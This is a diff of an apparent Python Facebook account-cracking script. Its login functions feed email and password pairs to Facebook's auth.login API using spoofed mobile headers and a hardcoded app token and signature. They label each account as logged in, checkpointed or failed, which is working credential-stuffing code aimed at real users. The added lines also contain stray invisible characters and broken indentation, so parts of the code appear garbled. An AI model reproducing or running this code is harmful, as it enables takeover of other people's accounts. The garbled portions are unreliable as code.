@@ -941,37 +941,39 @@ def tambah_pass_angka():
 def log_api_1(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
     r = requests.Session()
-    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
-    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
-    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
-    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
-    else:return {"status":"error","email":em,"pass":pas}
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
+        "x-fb-sim-hni": str(random.randint(20000, 40000)),
+        ‏        "x-fb-net-hni": str(random.randint(20000, 40000)),
+        ‏        "x-fb-connection-quality": "EXCELLENT",
+        ‏        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+        ‏        "user-agent": ua,
+        ‏        "content-type": "application/x-www-form-urlencoded",
+        ‏        "x-fb-http-engine": "Liger"}
+        ‏    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
+        ‏        'format': 'json', 
+        ‏        'sdk_version': '2', 
+        ‏        'email': em, 
+        ‏        'locale': 'en_US', 
+        ‏        'password': pas, 
+        ‏        'sdk': 'ios', 
+        ‏        'generate_session_cookies': '1', 
+        ‏        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+        ‏    api = 'https://b-api.facebook.com/method/auth.login'
+        ‏    response = r.get(api, params=param, headers=header)
+        ‏    if 'session_key' in response.text and 'EAAA' in response.text:
+        ‏        return {"status":"success","email":em,"pass":pas}
+        ‏    elif 'www.facebook.com' in response.json()['error_msg']:
+        ‏        return {"status":"cp","email":em,"pass":pas}
+        ‏    else:return {"status":"error","email":em,"pass":pas}
 def log_api_2(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
     r = requests.Session()
-    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-        "x-fb-sim-hni": str(random.randint(20000, 40000)),
-        "x-fb-net-hni": str(random.randint(20000, 40000)),
-        "x-fb-connection-quality": "EXCELLENT",
-        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-        "user-agent": ua,
-        "content-type": "application/x-www-form-urlencoded",
-        "x-fb-http-engine": "Liger"}
-    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
-        'format': 'json', 
-        'sdk_version': '2', 
-        'email': em, 
-        'locale': 'en_US', 
-        'password': pas, 
-        'sdk': 'ios', 
-        'generate_session_cookies': '1', 
-        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
     api = 'https://b-api.facebook.com/method/auth.login'
     response = r.get(api, params=param, headers=header)
-    if 'session_key' in response.text and 'EAAA' in response.text:
-        return {"status":"success","email":em,"pass":pas}
-    elif 'www.facebook.com' in response.json()['error_msg']:
-        return {"status":"cp","email":em,"pass":pas}
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
     else:return {"status":"error","email":em,"pass":pas}
 def log_mbasic_1(em,pas):
     ua = _azimvau_dapunta_('ugent.txt','r').read()
